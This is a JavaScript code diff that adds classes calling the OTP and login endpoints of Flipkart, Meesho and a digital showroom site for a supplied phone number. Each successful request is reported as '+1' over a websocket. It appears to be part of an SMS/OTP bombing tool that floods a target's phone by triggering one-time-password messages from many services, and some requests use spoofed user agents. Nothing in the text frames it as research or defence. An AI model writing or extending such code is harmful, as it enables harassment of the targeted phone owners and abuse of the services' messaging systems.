@@ -637,3 +637,49 @@ class fancode{
         })
     }
 }
+
+class flipkart{
+    constructor(number,ws){
+        fetch("https://1.rome.api.flipkart.com/api/7/user/otp/generate",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "X-User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop"
+            },
+            body:JSON.stringify({"loginId":"+91"+number})
+        }).then(res=>res.json()).then((data)=>{
+            if(data.RESPONSE.requestId)
+                ws.send("+1")
+        })
+    }
+}
+
+
+class gamezone{
+    constructor(number,ws){
+        fetch("https://api.dotshowroom.in/api/dotk/vo1/user/login/"+number+"?source=digital_showroom&domain=https://www.digitalgamezone.co.in/orders")
+        .then(res=>res.json()).then((data)=>{
+            if(data.status)
+                ws.send("+1")
+        })
+    }
+}
+
+class meesho{
+    constructor(number,ws){
+        fetch("https://www.meesho.com/api/v1/user/login/request-otp",{
+            method:"POST",
+            headers:{
+                "Content-Type":"application/json",
+                "User-Agent":"PostmanRuntime/7.41.2"
+            },
+            body:JSON.stringify({
+                "phone_number": number
+            })
+        })
+        .then(res=>res.json()).then((data)=>{
+            if(data.data)
+                ws.send("+1")
+        })
+    }
+}
